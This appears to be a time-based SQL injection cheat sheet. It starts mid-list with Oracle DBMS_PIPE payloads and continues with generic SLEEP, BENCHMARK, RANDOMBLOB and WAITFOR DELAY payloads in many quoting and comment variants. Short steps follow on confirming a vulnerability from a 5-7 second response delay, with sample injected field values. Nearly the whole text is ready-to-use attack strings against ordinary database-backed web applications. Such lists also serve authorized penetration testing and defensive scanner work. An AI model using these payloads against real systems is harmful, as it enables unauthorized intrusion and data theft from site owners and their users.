You can replace AND / OR
1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337
' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337
) AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337
Generic Time Based SQL Injection Payloads:
sleep(5)#
(sleep 5)--
(sleep 5)
(sleep(5))--
(sleep(5))
-sleep(5)
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
";sleep 5--
";sleep 5
";sleep(5)--
";sleep(5)
";SELECT SLEEP(5); #
1 SELECT SLEEP(5); #
+ SLEEP(5) + '
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
;sleep 5--
;sleep 5
;sleep(5)--
;sleep(5)
;SELECT SLEEP(5); #
'&&SLEEP(5)&&'1
' SELECT SLEEP(5); #
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
RANDOMBLOB(500000000/2)
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
If response delay between 5 to 7 Seconds .
It means vulnerable.
Detection and exploitation:
1.=payload
Example:
=0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
=(select(0)from(select(sleep(5)))v)
email=test@gmail.com' WAITFOR DELAY '0:0:5'--
email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
2.=value payload
Example:
=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='
=1'XOR(if(now()=sysdate(),sleep(5),0))OR'
=1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
    
=1 or sleep(5)#
